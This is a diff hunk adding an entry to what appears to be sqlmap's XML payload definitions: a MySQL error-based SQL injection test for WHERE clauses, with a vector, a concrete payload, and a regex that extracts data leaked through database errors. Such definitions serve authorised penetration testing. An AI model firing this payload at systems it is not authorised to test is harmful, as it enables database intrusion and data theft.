@@ -890,6 +890,26 @@ Formats:
     </test>
 
     <test>
+        <title>MySQL OR error-based - WHERE clause</title>
+        <stype>2</stype>
+        <level>2</level>
+        <risk>2</risk>
+        <clause>1</clause>
+        <where>2</where>
+        <vector>OR 1 GROUP BY CONCAT('[DELIMITER_START]',(%s),'[DELIMITER_STOP]',FLOOR(RAND(0)*2)) HAVING MIN(0)</vector>
+        <request>
+            <payload>OR 1 GROUP BY CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]',FLOOR(RAND(0)*2)) HAVING MIN(0)</payload>
+            <comment>#</comment>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+
+    <test>
         <title>PostgreSQL OR error-based - WHERE clause</title>
         <stype>2</stype>
         <level>2</level>
